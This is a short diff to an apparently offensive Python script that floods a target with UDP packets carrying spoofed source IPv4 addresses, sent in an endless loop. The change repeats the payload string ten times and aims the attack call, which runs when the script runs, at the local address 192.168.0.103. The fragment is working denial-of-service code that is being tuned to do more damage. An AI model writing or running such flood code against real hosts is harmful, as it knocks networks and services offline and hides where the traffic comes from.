@@ -17,7 +17,7 @@ def udp_attack(ip):
 #udp_attack("192.168.0.1")
 
 def spoof_udp_attack(ip):
-	message = b'You are being DDOS-UDP.'
+	message = b'You are being DDOS-UDP.' * 10
 
 	while 1:
 		src = spoof_ipv4()
@@ -27,6 +27,6 @@ def spoof_udp_attack(ip):
 		send(packet)
 		print(src + "attacks from port " + str(sport) +" to " + str(dport))
 
-spoof_udp_attack("192.168.0.1")
+spoof_udp_attack("192.168.0.103")
 
 
